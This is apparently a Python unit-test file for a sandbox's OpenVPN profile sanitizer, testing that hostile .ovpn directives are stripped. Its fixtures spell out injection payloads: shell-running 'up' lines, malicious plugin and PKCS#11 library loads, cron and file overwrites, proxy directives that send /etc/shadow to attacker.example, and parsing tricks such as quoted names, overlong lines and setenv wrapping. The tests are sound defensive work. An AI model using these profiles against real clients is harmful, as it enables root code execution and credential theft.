"""CWE-94: an imported .ovpn must not run code as root in the guest.

Run: python3 -B -m unittest discover -s Tests/GuestGraphicsTests -p "test_openvpn*" -v
"""

import importlib.util
from pathlib import Path
import unittest


ROOT = Path(__file__).resolve().parents[2]
SCRIPTS = ROOT / "Sources/SandboxEngine/Resources/vm-setup/scripts"


def load_script(name):
    spec = importlib.util.spec_from_file_location(name.replace("-", "_"), SCRIPTS / (name + ".py"))
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


config = load_script("config-agent")

HOSTILE = """client
dev tun
proto udp
remote vpn.example 1194
script-security 2
up "/bin/sh -c 'touch /tmp/pwned'"
--down /tmp/x.sh
route-up /tmp/y.sh
  TLS-Verify /tmp/z.sh
plugin /tmp/evil.so
iproute /tmp/fake-ip
management 0.0.0.0 7505
config /etc/shadow
log /etc/cron.d/pwn
auth-user-pass /tmp/creds
# up /tmp/commented.sh
<ca>
-----BEGIN CERTIFICATE-----
up looks-like-a-directive-but-is-cert-data
-----END CERTIFICATE-----
</ca>
cipher AES-256-GCM
"""


class OpenVPNConfigTests(unittest.TestCase):
    def test_root_running_directives_are_dropped(self):
        lines, dropped = config.sanitize_ovpn(HOSTILE)
        names, inline = set(), False
        for l in lines:
            s = l.strip()
            if s.startswith("<"):
                inline = not s.startswith("</")
                continue
            if inline or not s or s.startswith("#"):
                continue
            names.add(s.split(None, 1)[0].lower().lstrip("-"))
        for bad in ["script-security", "up", "down", "route-up", "tls-verify", "plugin",
                    "iproute", "management", "config", "log", "auth-user-pass"]:
            self.assertNotIn(bad, names, bad)
            self.assertIn(bad, dropped, bad)
        for good in ["client", "dev", "proto", "remote", "cipher"]:
            self.assertIn(good, names, good)

    def test_inline_blocks_and_comments_are_kept_verbatim(self):
        lines, _ = config.sanitize_ovpn(HOSTILE)
        text = "\n".join(lines)
        self.assertIn("up looks-like-a-directive-but-is-cert-data", text)
        self.assertIn("<ca>", text)
        self.assertIn("</ca>", text)
        self.assertIn("# up /tmp/commented.sh", text)

    def test_launch_overrides_script_security_after_the_config(self):
        src = (SCRIPTS / "openvpn-agent.py").read_text()
        launch = src[src.index("openvpn --config"):]
        launch = launch[:launch.index("% (OVPN_CONFIG")]
        self.assertIn("--script-security 1", launch)
        self.assertLess(launch.index("--config"), launch.index("--script-security 1"))


    # CWE-73: OpenVPN undoes quotes before it reads the option name, ends
    # an inline block at a line that STARTS with its close tag, and reads a
    # long line in 256-byte pieces. The sanitizer reads the file the same
    # way, so none of these is kept.
    def kept_names(self, text):
        lines, dropped = config.sanitize_ovpn(text)
        names, close = [], None
        for l in lines:
            if close is not None:
                if l.lstrip().startswith(close):
                    close = None
                continue
            t = config.openvpn_parse_line(l)
            if not t:
                continue
            n = t[0][2:] if t[0].startswith("--") and len(t[0]) >= 3 else t[0]
            if len(t) == 1 and n.startswith("<") and n.endswith(">"):
                close = "</%s>" % n[1:-1]
                n = n[1:-1]
            names.append(n.lower())
        return names, dropped

    def test_quoted_names_are_read_as_openvpn_reads_them(self):
        text = """client
"log" /mnt/share/profile.img
'log' /mnt/share/profile.img
"--log" /etc/passwd
'log-append' /mnt/share/profile.img
"--status" /mnt/share/profile.img
"lo"g /tmp/x
--"up" /tmp/x.sh
remote vpn.example 1194
"""
        names, dropped = self.kept_names(text)
        for bad in ["log", "log-append", "status", "up", "--up"]:
            self.assertNotIn(bad, names, bad)
        self.assertGreaterEqual(dropped.count("log"), 3)
        self.assertIn("log-append", dropped)
        self.assertIn("status", dropped)
        # `"lo"g` is two tokens to OpenVPN ("lo", "g"): an unknown option.
        self.assertIn("lo", names)
        self.assertIn("remote", names)
        self.assertIn("client", names)

    def test_tokenizer_matches_openvpn_parse_line(self):
        p = config.openvpn_parse_line
        self.assertEqual(p('"log" /x'), ["log", "/x"])
        self.assertEqual(p("'log-append' '/a b'"), ["log-append", "/a b"])
        self.assertEqual(p('"lo"g'), ["lo", "g"])
        self.assertEqual(p('a\\ b c'), ["a b", "c"])
        self.assertEqual(p('"a\\"b"'), ['a"b'])
        self.assertEqual(p("  # comment"), [])
        self.assertEqual(p("remote x # trailing"), ["remote", "x"])
        self.assertIsNone(p("l\\og /x"))          # bad backslash: OpenVPN ignores the line
        self.assertIsNone(p('"log /x'))            # unclosed quote: ignored

    def test_inline_block_ends_where_openvpn_ends_it(self):
        text = """client
<ca>
-----BEGIN CERTIFICATE-----
  </ca>trailing text ends the block for OpenVPN
log /mnt/share/profile.img
"""
        names, dropped = self.kept_names(text)
        self.assertNotIn("log", names)
        self.assertIn("log", dropped)
        # A forbidden inline block goes whole.
        names, dropped = self.kept_names("<config>\nup /x\n</config>\nclient\n")
        self.assertIn("config", dropped)
        self.assertEqual(names, ["client"])

    def test_a_line_openvpn_would_split_is_dropped(self):
        long_line = "remote " + "a" * 249 + "log /mnt/share/profile.img"
        lines, dropped = config.sanitize_ovpn("client\n" + long_line + "\n")
        self.assertEqual(lines, ["client"])
        self.assertTrue(dropped)
        for l in config.sanitize_ovpn(HOSTILE)[0]:
            self.assertLess(len(l.encode()), 255)

    def test_library_loaders_are_dropped(self):
        names, dropped = self.kept_names(
            "engine /mnt/share/evil.so\nproviders /mnt/share/evil\n"
            "pkcs11-providers /mnt/share/evil.so\nreplay-persist /etc/passwd\nclient\n")
        self.assertEqual(names, ["client"])
        for bad in ["engine", "providers", "pkcs11-providers", "replay-persist"]:
            self.assertIn(bad, dropped)

    # CWE-73: a proxy's username/password FILE is read by root and its two
    # lines sent to the proxy the profile names — /etc/shadow, or our own
    # credentials file, to attacker.example.
    def test_proxy_auth_files_are_dropped(self):
        text = """client
dev tun
proto tcp
remote 203.0.113.5 1194
nobind
http-proxy attacker.example 8080 /etc/openvpn/bromure-auth.txt
"http-proxy" attacker.example 8080 /etc/shadow basic
socks-proxy attacker.example 1080 /etc/shadow
http-proxy-user-pass /etc/shadow
"""
        lines, dropped = config.sanitize_ovpn(text)
        kept = "\n".join(lines)
        self.assertNotIn("/etc/shadow", kept)
        self.assertNotIn("bromure-auth.txt", kept)
        self.assertGreaterEqual(dropped.count("http-proxy"), 2)
        self.assertIn("socks-proxy", dropped)
        self.assertIn("http-proxy-user-pass", dropped)
        self.assertIn("remote 203.0.113.5 1194", kept)

    def test_proxies_without_a_file_stay(self):
        text = """http-proxy proxy.corp 3128
http-proxy proxy.corp 3128 auto
socks-proxy proxy.corp 1080
<http-proxy-user-pass>
user
pass
</http-proxy-user-pass>
"""
        lines, dropped = config.sanitize_ovpn(text)
        self.assertEqual(lines, text.splitlines())
        self.assertEqual(dropped, [])

    def test_connection_blocks_are_sanitized_too(self):
        text = """client
<connection>
remote 203.0.113.5 1194 tcp
http-proxy attacker.example 8080 /etc/shadow
"socks-proxy" attacker.example 1080 /etc/shadow
</connection>
"""
        lines, dropped = config.sanitize_ovpn(text)
        self.assertEqual(lines, ["client", "<connection>", "remote 203.0.113.5 1194 tcp", "</connection>"])
        self.assertIn("http-proxy", dropped)
        self.assertIn("socks-proxy", dropped)

    # CWE-94: `</ca> # x` closes the block for OpenVPN (a prefix, after
    # leading spaces); the plugin and config lines after it are options.
    def test_close_tag_with_trailing_text_ends_the_block(self):
        text = """client
<ca>
-----BEGIN CERTIFICATE-----
MIIB
-----END CERTIFICATE-----
</ca> # x
plugin /tmp/evil.so
config /tmp/extra.ovpn
remote vpn.example 1194
"""
        names, dropped = self.kept_names(text)
        self.assertNotIn("plugin", names)
        self.assertNotIn("config", names)
        self.assertIn("plugin", dropped)
        self.assertIn("config", dropped)
        self.assertIn("remote", names)
        kept = "\n".join(config.sanitize_ovpn(text)[0])
        self.assertNotIn("evil.so", kept)
        self.assertNotIn("extra.ovpn", kept)
        self.assertIn("MIIB", kept)          # the certificate itself stays
        # Case matters to OpenVPN: `</CA>` doesn't close `<ca>`, so what
        # follows is still certificate data — kept, never an option.
        lines, _ = config.sanitize_ovpn("<ca>\n</CA>\nplugin /x.so\n</ca>\nclient\n")
        self.assertEqual(lines, ["<ca>", "</CA>", "plugin /x.so", "</ca>", "client"])
        # A tag that isn't the line's only token opens no block.
        names, _ = self.kept_names("<ca> extra\nplugin /x.so\nclient\n")
        self.assertNotIn("plugin", names)

    # CWE-94: an OpenSSL provider or a PKCS#11 module is a shared library
    # openvpn dlopens as root at startup, whatever --script-security says.
    def test_pkcs11_and_openssl_library_loads_are_dropped(self):
        text = """client
pkcs11-providers /tmp/evil.so
"pkcs11-providers" /tmp/evil.so
providers /tmp/evil.so
--providers legacy /tmp/evil.so
engine dynamic
show-pkcs11-ids /tmp/evil.so
pkcs11-id 'x'
pkcs11-id-management
PKCS11-Providers /tmp/evil.so
remote vpn.example 1194
"""
        names, dropped = self.kept_names(text)
        self.assertEqual(names, ["client", "remote"])
        self.assertNotIn("evil.so", "\n".join(config.sanitize_ovpn(text)[0]))
        for bad in ["pkcs11-providers", "providers", "engine", "show-pkcs11-ids",
                    "pkcs11-id", "pkcs11-id-management"]:
            self.assertIn(bad, dropped, bad)

    # CWE-94: OpenVPN runs `setenv opt <directive>` as the directive itself.
    def test_setenv_opt_is_read_as_the_directive_it_wraps(self):
        text = """client
setenv opt log /mnt/share/profile.img
"setenv" opt plugin /tmp/evil.so
setenv opt pkcs11-providers /tmp/evil.so
setenv 'opt' config /tmp/extra.ovpn
setenv opt --providers /tmp/evil.so
setenv opt setenv opt log-append /mnt/share/profile.img
setenv opt block-outside-dns
setenv CLIENT_CERT 0
remote vpn.example 1194
"""
        lines, dropped = config.sanitize_ovpn(text)
        kept = "\n".join(lines)
        for bad in ["profile.img", "evil.so", "extra.ovpn"]:
            self.assertNotIn(bad, kept, bad)
        for name in ["log", "plugin", "pkcs11-providers", "config", "providers", "log-append"]:
            self.assertIn(name, dropped, name)
        # Harmless uses stay: an unknown-tolerant option, a plain variable.
        self.assertIn("setenv opt block-outside-dns", kept)
        self.assertIn("setenv CLIENT_CERT 0", kept)
        self.assertIn("remote vpn.example 1194", kept)
        # A wrapped tag opens no block for OpenVPN: what follows is options.
        lines, dropped = config.sanitize_ovpn("setenv opt <ca>\nlog /mnt/share/profile.img\n</ca>\nclient\n")
        self.assertNotIn("log /mnt/share/profile.img", lines)
        self.assertIn("log", dropped)

    # CWE-73: genkey writes a generated key to the path the profile names
    # (as root, then stops) — the host's profile disk on the share.
    def test_file_writing_and_one_shot_modes_are_dropped(self):
        text = """client
genkey secret /mnt/share/profile.img
"--genkey" tls-crypt-v2-client /etc/passwd
memstats /mnt/share/profile.img
rmtun
mktun
test-crypto
remote vpn.example 1194
"""
        names, dropped = self.kept_names(text)
        self.assertEqual(names, ["client", "remote"])
        self.assertNotIn("profile.img", "\n".join(config.sanitize_ovpn(text)[0]))
        for bad in ["genkey", "memstats", "rmtun", "mktun", "test-crypto"]:
            self.assertIn(bad, dropped, bad)

    # OpenVPN reads a long line inside an inline block in pieces and joins
    # them: a 300-character certificate line is valid and must stay.
    def test_long_certificate_lines_are_kept(self):
        body = "M" + "A" * 299
        text = "client\n<ca>\n-----BEGIN CERTIFICATE-----\n" + body + "\n-----END CERTIFICATE-----\n</ca>\nremote vpn.example 1194\n"
        lines, dropped = config.sanitize_ovpn(text)
        self.assertIn(body, lines)
        self.assertEqual(dropped, [])

    def test_a_long_line_hiding_a_close_tag_is_dropped(self):
        # The piece starting at byte 255 opens with </ca>: OpenVPN ends the
        # block there and reads what follows on that line as options.
        hidden = "A" * 255 + "</ca>"
        text = "<ca>\n" + hidden + "\nlog /mnt/share/profile.img\n</ca>\nclient\n"
        lines, dropped = config.sanitize_ovpn(text)
        self.assertNotIn(hidden, lines)
        self.assertIn("(an overlong line)", dropped)
        # Inside a forbidden block, or at top level, a long line still goes.
        lines, _ = config.sanitize_ovpn("<config>\n" + "B" * 300 + "\n</config>\n")
        self.assertNotIn("B" * 300, lines)
        lines, _ = config.sanitize_ovpn("remote " + "a" * 300 + "\n")
        self.assertEqual(lines, [])

    # OpenVPN reparses a <connection> body with buf_parse into 256 bytes: a
    # 255-byte line is one line there (not split), a longer one is split.
    def test_a_255_byte_line_inside_connection_is_kept(self):
        remote = "remote vpn.example 1194 tcp"
        remote = remote + " " * (255 - len(remote) - 2) + "#x"
        cert = "A" * 255
        self.assertEqual(len(remote.encode()), 255)
        text = "client\n<connection>\n%s\n<ca>\n%s\n</ca>\n</connection>\n" % (remote, cert)
        lines, dropped = config.sanitize_ovpn(text)
        self.assertIn(remote, lines)
        self.assertIn(cert, lines)          # right before </ca>: nothing to glue, kept whole
        self.assertNotIn("(an overlong line)", dropped)
        # 256 bytes: buf_parse splits it (and loses a byte) — still dropped,
        # in the body and in a block nested in it.
        long_remote = remote + "y"
        lines, dropped = config.sanitize_ovpn(
            "<connection>\n%s\n<ca>\n%s\n</ca>\n</connection>\n" % (long_remote, cert + "B"))
        self.assertNotIn(long_remote, lines)
        self.assertNotIn(cert + "B", lines)
        self.assertEqual(dropped.count("(an overlong line)"), 2)
        # A 255-byte line in the body is still sanitized like any other.
        evil = "plugin /tmp/evil.so" + " " * (255 - 19 - 2) + "#x"
        lines, dropped = config.sanitize_ovpn("<connection>\n%s\n</connection>\n" % evil)
        self.assertNotIn(evil, lines)
        self.assertIn("plugin", dropped)

    def test_a_255_byte_line_in_a_block_nested_in_connection_keeps_its_footer(self):
        # OpenVPN reads a nested block back into 256 bytes: a 255-byte line
        # gets no newline, and the footer after it is glued on (the key or
        # certificate then fails to load). Written as two shorter lines.
        key_line = "0123456789abcdef" * 15 + "0123456789abcde"
        pem_line = "MIIB" * 63 + "abc"
        self.assertEqual((len(key_line), len(pem_line)), (255, 255))
        for tag, body, footer in (
                ("tls-crypt", key_line, "-----END OpenVPN Static key V1-----"),
                ("ca", pem_line, "-----END CERTIFICATE-----")):
            text = "<connection>\nremote vpn.example 1194\n<%s>\n%s\n%s\n</%s>\n</connection>\n" % (
                tag, body, footer, tag)
            lines, dropped = config.sanitize_ovpn(text)
            self.assertEqual(dropped, [])
            i = lines.index(footer)
            self.assertEqual(lines[i - 2:i], [body[:254], body[254:]])
            self.assertTrue(all(len(l.encode()) < 255 for l in lines))
        # Outside <connection>, and for options in it, nothing is split.
        lines, _ = config.sanitize_ovpn("<ca>\n%s\n-----END CERTIFICATE-----\n</ca>\n" % pem_line)
        self.assertIn(pem_line, lines)
        self.assertEqual(config._split_utf8("é" * 200, 254), ["é" * 127, "é" * 73])

    def test_a_255_byte_proxy_credential_inside_connection_is_not_split(self):
        # <http-proxy-user-pass> is two records (username, password), not
        # base64: a split cut a 255-byte password to 254 bytes, or turned
        # a 255-byte username's tail into the password.
        pw = "p" * 255
        text = ("<connection>\nremote vpn.example 1194\n<http-proxy-user-pass>\nalice\n%s\n"
                "</http-proxy-user-pass>\n</connection>\n" % pw)
        lines, dropped = config.sanitize_ovpn(text)
        self.assertEqual(dropped, [])
        i = lines.index("alice")
        self.assertEqual(lines[i:i + 3], ["alice", pw, "</http-proxy-user-pass>"])
        user = "u" * 255
        text = ("<connection>\nremote vpn.example 1194\n<http-proxy-user-pass>\n%s\nsecret\n"
                "</http-proxy-user-pass>\n</connection>\n" % user)
        lines, _ = config.sanitize_ovpn(text)
        i = lines.index(user)
        self.assertEqual(lines[i + 1], "secret")
        # A key line followed by its footer is still split (the earlier fix).
        key_line = "0123456789abcdef" * 15 + "0123456789abcde"
        text = ("<connection>\nremote vpn.example 1194\n<tls-crypt>\n%s\n-----END OpenVPN Static key V1-----\n"
                "</tls-crypt>\n</connection>\n" % key_line)
        lines, _ = config.sanitize_ovpn(text)
        self.assertIn(key_line[:254], lines)
        self.assertNotIn(key_line, lines)

if __name__ == "__main__":
    unittest.main()
